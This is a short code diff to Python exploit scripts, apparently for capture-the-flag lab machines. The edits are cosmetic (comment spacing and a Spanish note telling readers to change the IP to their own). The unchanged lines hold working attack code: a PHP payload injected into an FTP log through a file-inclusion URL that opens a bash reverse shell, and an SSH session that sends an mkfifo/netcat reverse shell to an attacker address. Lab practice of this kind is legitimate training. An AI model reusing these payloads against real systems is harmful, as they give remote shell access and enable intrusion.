@@ -19,6 +19,7 @@ import ftplib
 # Variables globales
 
 main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
+# Cambiar IP por la vuestra
 payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
 lport = 443
 
@@ -65,7 +66,7 @@ import re
 from pexpect import pxssh
 import html
 
-#Variables globales
+# Variables globales
 main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
 #burp = {'http': 'http://127.0.0.1:8080'}
 lport = 443
@@ -103,7 +104,7 @@ def MakeRequest():
 def sshconnection(username, password):
     s = pxssh.pxssh()
     s.login('10.10.11.100', username, password)
-    #Cambiar IP por la vuestra
+    # Cambiar IP por la vuestra
     s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
     s.prompt()
     s.logout()
